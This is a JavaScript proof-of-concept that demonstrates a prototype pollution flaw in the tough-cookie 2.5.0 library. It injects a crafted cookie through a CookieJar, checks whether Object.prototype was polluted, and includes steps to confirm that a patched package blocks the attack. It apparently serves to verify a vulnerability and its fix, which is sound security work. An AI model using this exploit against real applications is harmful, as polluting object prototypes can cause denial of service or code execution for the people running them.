/*
  This file demonstrates an exploit for the Prototype Pollution vulnerability in tough-cookie 2.5.0.

  Vulnerability Details:
   In tough-cookie 2.5.0, when creating a CookieJar with rejectPublicSuffixes=false,
   the internal store is built using objects that inherit from Object.prototype. This means
   that an attacker can set cookies with a domain like "__proto__" which pollutes the Object.prototype,
   causing every object in the application to inherit malicious properties. This can lead to
   denial-of-service or even remote code execution in certain contexts.

   Instructions:
     1. With vulnerable package:
        npm install tough-cookie@2.5.0 && node index.js
        Expected Output: "EXPLOITED SUCCESSFULLY"

     2. With patched package:
        npm install ./tough-cookie-2.5.0-PATCHED.tgz && node index.js
        Expected Output: "EXPLOIT FAILED"
*/

var assert = require('assert');
var tough = require("tough-cookie");
var config = require("./lib/config.js");

async function setCookie(jar, cookieString, url) {
  return new Promise((resolve, reject) => {
    jar.setCookie(cookieString, url, {}, (err, cookie) => {
      if (err) return reject(err);
      resolve(cookie);
    });
  });
}

function log(message) {
  const timestamp = new Date().toISOString();
  console.log(message);
};

async function exploitPollution() {
  const jar = new tough.CookieJar(undefined, { rejectPublicSuffixes: config.rejectPublicSuffixes });

  try {
    // Exploit cookie
    await setCookie(jar, `${config.exploitCookieName}=${config.exploitCookieValue}; Domain=${config.cookieDomain}; Path=${config.cookiePath}`, config.testUrl);

    // Normal cookie
    await setCookie(jar, `${config.normalCookieName}=${config.normalCookieValue}; Domain=${config.googleCookieDomain}; Path=${config.cookiePath}`, config.normalUrl);

    // Check for pollution
    const obj = {};
    const pollutedObject = obj[config.cookiePath] && obj[config.cookiePath][config.exploitCookieName];

    if (pollutedObject?.value === config.exploitCookieValue) {
      log(config.exploitedSuccessfully);
    } else {
      log(config.exploitFailed);
    }
  } catch (e) {
    log(`${config.exploitError}: ${e.message}`);
    log(config.exploitFailed);
  }
}

exploitPollution();
